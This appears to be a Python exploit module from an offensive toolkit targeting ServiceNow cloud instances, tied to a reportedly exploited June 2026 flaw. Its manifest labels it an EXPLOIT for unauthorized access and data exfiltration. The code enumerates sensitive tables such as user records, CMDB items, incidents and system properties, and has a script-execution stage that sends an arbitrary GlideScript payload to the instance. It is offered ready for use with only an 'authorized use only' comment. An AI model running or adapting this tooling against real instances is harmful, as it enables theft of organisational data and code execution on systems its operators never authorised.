"""ServiceNow Instance Unauthorized Access (Actively Exploited, Jun 2026).

A vulnerability in ServiceNow is being actively exploited to gain unauthorized
access to customer instances. The attack allows threat actors to access
sensitive customer data, configurations, and potentially escalate to code
execution via ServiceNow scripting capabilities.

ServiceNow instances typically contain sensitive organizational data including:
  - IT asset inventory, CMDB data
  - User credentials and access tokens
  - Workflow automations and integrations
  - Business process data

CVSS: HIGH (active exploitation)
References:
  - https://boletimsec.com/falha-no-servicenow-e-explorada-para-acessar-instancias-de-clientes/
Affected: ServiceNow instances (specific versions, see advisory)

Author: Andre Henrique (@mrhenrike) | Uniao Geek
# authorized use only
"""
from __future__ import annotations

import base64
import json
import logging
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

logger = logging.getLogger(__name__)

MANIFEST = {
    "name": "servicenow-instance-access",
    "description": "ServiceNow instance unauthorized access and data exfiltration (actively exploited Jun 2026)",
    "capability_id": "cloudxpl.paas.servicenow.instance_access",
    "cve": "ServiceNow Jun 2026",
    "cvss": 8.0,
    "safety_class": "EXPLOIT",
    "mitre": ["T1190", "T1078"],
    "references": [
        "https://boletimsec.com/falha-no-servicenow-e-explorada-para-acessar-instancias-de-clientes/",
    ],
    "devices": ["ServiceNow (cloud instances)"],
}

_SNOW_API_PATHS = [
    "/api/now/table/sys_user",
    "/api/now/table/cmdb_ci",
    "/api/now/table/incident",
    "/api/now/table/sys_properties",
    "/api/now/v2/table/sys_user",
]
_SNOW_HEALTH = "/api/now/table/sys_choice?sysparm_limit=1"
_SNOW_SCRIPT_PATH = "/api/now/script/run"


def _base_url(instance: str, custom_url: str) -> str:
    if custom_url:
        return str(custom_url).rstrip("/")
    if instance:
        return f"https://{instance}.service-now.com"
    return ""


def _auth_headers(username: str, password: str) -> dict:
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    if username and password:
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers["Authorization"] = f"Basic {creds}"
    return headers


def _query(url: str, headers: dict, timeout: float = 5) -> str:
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read())
            results = data.get("result", [])
            return f"{len(results)} record(s)"
    except urllib.error.HTTPError as exc:
        return f"HTTP {exc.code}"
    except Exception as exc:
        return str(exc)


def check(args: Any) -> str:
    instance = getattr(args, "instance", "") or ""
    custom_url = getattr(args, "custom_url", "") or ""
    username = getattr(args, "username", "") or ""
    password = getattr(args, "password", "") or ""
    base = _base_url(instance, custom_url)
    if not base:
        return "Set instance or custom_url option"

    url = f"{base}/api/now/table/sys_user?sysparm_limit=1&sysparm_fields=user_name"
    headers = _auth_headers(username, password)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
            records = data.get("result", [])
            return (
                f"ServiceNow at {base} accessible [{resp.status}] - "
                f"sys_user returned {len(records)} record(s)"
            )
    except urllib.error.HTTPError as exc:
        if exc.code == 401:
            return f"ServiceNow at {base} [401] - auth required, provide credentials"
        if exc.code == 403:
            return f"ServiceNow at {base} [403] - access denied for this endpoint"
        return f"ServiceNow at {base} [{exc.code}] - assess manually"
    except Exception:
        pass
    return f"No ServiceNow response at {base}"


def run(args: Any) -> int:
    instance = getattr(args, "instance", "") or ""
    custom_url = getattr(args, "custom_url", "") or ""
    username = getattr(args, "username", "") or ""
    password = getattr(args, "password", "") or ""
    action = getattr(args, "action", "enumerate") or "enumerate"
    script_payload = getattr(args, "script_payload", "gs.info('XPL probe: ' + gs.getUserName())") or ""

    base = _base_url(instance, custom_url)
    if not base:
        print("[!] Set instance or custom_url option")
        return 1

    headers = _auth_headers(username, password)

    logger.info("[*] Stage 1: Probing ServiceNow instance at %s", base)
    probe = _query(f"{base}/api/now/table/sys_user?sysparm_limit=1", headers)
    logger.info("[*] Instance info: %s", probe)

    if action in ("enumerate", "exfil_users"):
        logger.info("[*] Stage 2: Enumerating sensitive tables")
        for path in _SNOW_API_PATHS:
            result = _query(base + path, headers)
            logger.info("[*] %s: %s", path, result[:200])

    if action == "script_exec":
        logger.info("[*] Stage 3: Attempting GlideScript execution via %s", _SNOW_SCRIPT_PATH)
        payload = json.dumps({"script": script_payload}).encode()
        req = urllib.request.Request(f"{base}{_SNOW_SCRIPT_PATH}", data=payload, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                result = resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            try:
                result = exc.read().decode("utf-8", "replace")
            except Exception:
                result = f"HTTP {exc.code}"
        except Exception as exc:
            result = str(exc)
        logger.info("[+] Script result: %s", result)

    return 0
